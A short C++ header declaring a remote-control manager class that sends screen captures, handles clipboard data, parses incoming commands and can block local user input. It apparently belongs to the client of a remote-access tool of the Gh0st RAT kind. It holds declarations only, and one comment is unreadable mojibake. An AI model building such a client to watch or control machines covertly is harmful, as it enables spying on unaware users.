#pragma once
#include "Manager.h"
#include "ScreenSpy.h"
class CClientRemoteControlManager :
	public CManager
{
public:
	CClientRemoteControlManager(_CIOCPClient* ClientObject);
	~CClientRemoteControlManager();
	void HandleIO(PBYTE BufferData, ULONG_PTR BufferLength);
	static  DWORD WINAPI  SendProcedure(LPVOID ParameterData);
	VOID SendBitmapInfo();
	VOID SendFirstScreenData();
	VOID SendNextScreenData();
	VOID AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength);
	VOID SendClipboardData();
	VOID UpdateClipboardData(char* BufferData, ULONG BufferLength);

public:
	BOOL    m_IsLoop;
	HANDLE  m_ThreadHandle;
	CScreenSpy* m_ScreenSpy;
	BOOL    m_IsBlockInput;   //���ΪTRUE�����ͻ��˲�������
};

